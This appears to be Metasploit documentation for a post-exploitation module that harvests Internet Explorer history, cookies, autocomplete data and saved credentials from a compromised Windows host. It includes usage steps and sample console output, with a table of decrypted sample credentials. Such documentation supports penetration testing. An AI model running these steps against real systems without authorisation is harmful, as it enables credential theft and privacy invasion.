## Vulnerable Application

  This post-exploitation module will extract saved user data from Internet Explorer. For IE versions of 7 and newer the module will try to extract and decrypt saved credentials as well.

## Verification Steps

  1. Start `msfconsole`
  2. Get meterpreter session
  3. Do: `use post/windows/gather/enum_ie`
  4. Do: `set SESSION <session id>`
  5. Do: `run`
  6. You should be able to see the extracted IE browser data in the loot files

## Options

  - **SESSION** - The session to run the module on.

## Extracted data

  - History
  - Cookies
  - Autocomplete data
  - Credentials **(only for >= IE7)**
    - HTTP auth credentials
    - Saved form credentials

## Scenarios

  **Using the module with an earlier version than IE7 (IE6)**

  In this scenario the module won't be able to extract credential data.

  ```
  msf exploit(handler) > use post/windows/gather/enum_ie
  msf post(enum_ie) > set SESSION 1
  SESSION => 1
  msf post(enum_ie) > run

  [*] IE Version: 6.0.2900.5512
  [-] This module will only extract credentials for >= IE7
  [*] Retrieving history.....
          File: C:\Documents and Settings\user\Local Settings\History\History.IE5\index.dat
  [*] Retrieving cookies.....
          File: C:\Documents and Settings\user\Cookies\index.dat
  [*] Looping through history to find autocomplete data....
  [-] No autocomplete entries found in registry
  [*] Looking in the Credential Store for HTTP Authentication Creds...
  [*] Writing history to loot...
  [*] Data saved in: /home/user/.msf4/loot/20161031155122_default_10.0.2.15_ie.history_747359.txt
  [*] Writing cookies to loot...
  [*] Data saved in: /home/user/.msf4/loot/20161031155122_default_10.0.2.15_ie.cookies_795069.txt
  [*] Post module execution completed
  ```

  **Using the module with IE7+ (IE8)**

  In this scenario the module will try to extract credential data, display it in the console and save it in a loot file.

  ```
  msf exploit(handler) > use post/windows/gather/enum_ie
  msf post(enum_ie) > set SESSION 1
  SESSION => 1
  msf post(enum_ie) > run

  [*] IE Version: 8.0.7601.17514
  [*] Retrieving history.....
          File: C:\Users\IEUser\AppData\Local\Microsoft\Windows\History\History.IE5\index.dat
          File: C:\Users\IEUser\AppData\Local\Microsoft\Windows\History\Low\History.IE5\index.dat
  [*] Retrieving cookies.....
          File: C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Cookies\index.dat
          File: C:\Users\IEUser\AppData\Roaming\Microsoft\Windows\Cookies\Low\index.dat
  [*] Looping through history to find autocomplete data....
  [*] Looking in the Credential Store for HTTP Authentication Creds...
  [*] Writing history to loot...
  [*] Data saved in: /home/user/.msf4/loot/20161031201908_default_10.0.2.15_ie.history_555694.txt
  [*] Writing cookies to loot...
  [*] Data saved in: /home/user/.msf4/loot/20161031201908_default_10.0.2.15_ie.cookies_216987.txt
  [*] Writing gathered credentials to loot...
  [*] Data saved in: /home/user/.msf4/loot/20161031201908_default_10.0.2.15_ie.user.creds_355504.txt

  Credential data
  ===============

   Type           Url                                     User           Pass
   ----           ---                                     ----           ----
   Auto Complete  https://wordpresssite.net/wp-login.php  sampleUser     P455w0rd
   Auto Complete  https://wordpresssite.net/wp-login.php  sampleUser     P455w0rd

  [*] Post module execution completed
  ```

  The extracted history data would in both scenarios for example look like this:

  ```
  History data
  ============

   Date Modified              Date Accessed              Url
   -------------              -------------              ---
   2011-11-20T23:59:02+00:00  2011-11-20T23:59:02+00:00  about:Home
   2016-10-31T14:42:05+00:00  2016-10-31T14:42:05+00:00  http://go.microsoft.com/fwlink/?LinkId=54729&clcid=0x0407
   2016-10-31T14:42:06+00:00  2016-10-31T14:42:06+00:00  http://de.msn.com/?ocid=iefvrt
   2016-10-31T14:42:08+00:00  2016-10-31T14:42:08+00:00  http://www.microsoft.com/isapi/redir.dll?prd=ie&pver=6&ar=msnhome
   2016-10-31T14:42:23+00:00  2016-10-31T14:42:23+00:00  http://www.msn.com/de-de?ocid=iefvrt
   2016-10-31T14:47:42+00:00  2016-10-31T14:47:42+00:00  file:///E:/text.txt
  ```
